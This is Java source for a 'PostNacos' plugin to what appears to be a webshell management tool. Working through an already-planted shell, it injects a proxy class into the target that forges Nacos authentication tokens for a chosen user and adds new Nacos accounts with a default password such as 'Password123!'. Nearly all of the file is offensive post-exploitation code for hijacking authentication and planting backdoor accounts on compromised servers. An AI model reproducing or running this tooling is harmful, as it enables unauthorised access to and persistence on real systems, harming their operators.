package shells.plugins.postnacos;

import com.formdev.flatlaf.util.StringUtils;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import java.lang.reflect.Method;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.Objects;

@PluginAnnotation(payloadName = "JavaDynamicPayload",Name = "PostNacos",DisplayName = "PostNacos")
public class PostNacosPlugin implements Plugin {
    private JButton makeTokenButton;
    private JButton addUserButton;
    private JButton updatePasswordButton;
    private JButton enumAllUserButton;
    private JButton enumAllSpaceButton;
    private RTextArea resultTextArea;
    private RTextScrollPane resultTextScrollPane;

    private ShellEntity shellEntity;
    private Payload payload;
    private boolean loaded = false;
    private static final String CLASS_NAME = "PostNacosProxy";
    private Encoding encoding;
    private JPanel corePanel;

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this,this);
    }

    @Override
    public JPanel getView() {
        return corePanel;
    }

    private boolean load(){
        if (!loaded){
            loaded = payload.include(CLASS_NAME, functions.readInputStreamAutoClose(Objects.requireNonNull(PostNacosPlugin.class.getResourceAsStream("PostNacosProxy.classs"))));
        }
        return loaded;
    }
    private void makeTokenButtonClick(ActionEvent actionEvent) {
        if (load()){
        String userName = GOptionPane.showInputDialog("target UserName","nacos");
        if (!StringUtils.isEmpty(userName)){
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("username",encoding.Encoding(userName));
            resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"MakeToken",reqParameter)));
        }
        }else {
            resultTextArea.setText("plugin not loaded");
        }

    }
    private void addUserButtonClick(ActionEvent actionEvent) {
        if (load()){
            JLabel userNameLabel = new JLabel("username:");
            JLabel passwordLabel = new JLabel("password:");

            JTextField usernameTextField= new JTextField("audit");
            JTextField passwordTextField = new JTextField("Password123!");

            JPanel propertyPanel = new JPanel();
            propertyPanel.setLayout(new GridLayout(3,2,5,5));
            propertyPanel.add(userNameLabel);
            propertyPanel.add(usernameTextField);
            propertyPanel.add(passwordLabel);
            propertyPanel.add(passwordTextField);


            int option = GOptionPane.showConfirmDialog( UiFunction.getParentWindow(corePanel),propertyPanel, "Input Property", GOptionPane.OK_CANCEL_OPTION);

            if (option == GOptionPane.CANCEL_OPTION){
                GOptionPane.showMessageDialog(UiFunction.getParentWindow(corePanel),"取消操作");
                return;
            }

            String userName = usernameTextField.getText();
            String password = passwordTextField.getText();

            if (!StringUtils.isEmpty(userName) && !StringUtils.isEmpty(password)){
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("username",encoding.Encoding(userName));
                reqParameter.add("password",encoding.Encoding(password));

                resultTextArea.setText(encoding.Decoding(payload.evalFunc(CLASS_NAME,"userAdd",reqParameter)));
            }
        }else {
            resultTextArea.setText("plugin not loaded");
        }
    }

}
